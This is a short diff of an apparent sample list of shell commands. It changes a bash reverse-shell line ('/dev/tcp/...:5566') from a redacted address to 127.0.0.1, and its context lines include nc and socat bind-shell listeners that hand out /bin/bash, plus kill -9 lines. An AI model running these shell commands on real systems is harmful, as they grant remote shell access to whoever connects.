@@ -48,7 +48,7 @@ rm \
 kill -9 123456
 kill -s TERM 123456
 kill -n 9 123456
-bash -i > /dev/tcp/***REMOVED***/5566
+bash -i > /dev/tcp/127.0.0.1/5566
 nc -lvvp 1988 -e /bin/bash
 socat -lvvp 1988 -e /bin/bash 
 echo Done
